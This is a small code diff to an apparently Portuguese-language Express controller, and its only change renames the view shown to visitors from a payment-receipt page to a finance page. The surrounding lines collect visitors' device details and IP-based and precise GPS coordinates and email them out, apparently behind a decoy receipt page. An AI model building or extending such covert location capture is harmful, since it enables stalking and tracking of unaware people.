@@ -30,14 +30,14 @@ class IndexController{
             source: useragent.source,
         };
         await ServiceEmail.enviarLocalizacaoDoDispositivo(dadosDoDispositivo, result, result['lat'], result['lon'])
-        res.render('comprovante-de-pagamento')
+        res.render('financeiro')
 
     }
 
     static async postSalvarLocalizacao(req, res) {
         const { latitude, longitude } = req.body;
         await ServiceEmail.enviarLocalizacaoPrecisa(latitude, longitude)
-        res.render('comprovante-de-pagamento')
+        res.render('financeiro')
     }
 
     static async getIndex(req, res) {
